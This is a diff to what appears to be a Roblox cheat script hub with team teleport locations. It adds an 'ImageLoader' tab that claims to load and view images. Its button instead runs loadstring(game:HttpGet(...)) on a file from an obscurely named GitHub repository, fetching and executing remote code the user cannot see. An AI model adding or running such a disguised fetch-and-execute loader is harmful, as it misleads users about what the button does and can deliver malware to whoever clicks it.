@@ -778,6 +778,15 @@ local TeamsTab = Window:Tab({
     Icon = "group",
     Desc = "Teleport to different teams."
 })
+Tabs.ImageLoaderTab = Window:Tab({ Title = "ImageLoader", Icon = "image", Desc = "Load and view images." })
+
+Tabs.ImageLoaderTab:Button({
+    Title = "LoadImageLoader",
+    Desc = "Click to execute the script",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/DNCJDNDJDJ/Hghghfhf-tht-tht/refs/heads/main/Ngjgjghthghghbg"))()
+    end
+})
 
 local teleportLocations = {
     ["White Team"] = Vector3.new(-50.11, -8.19, -591.96),
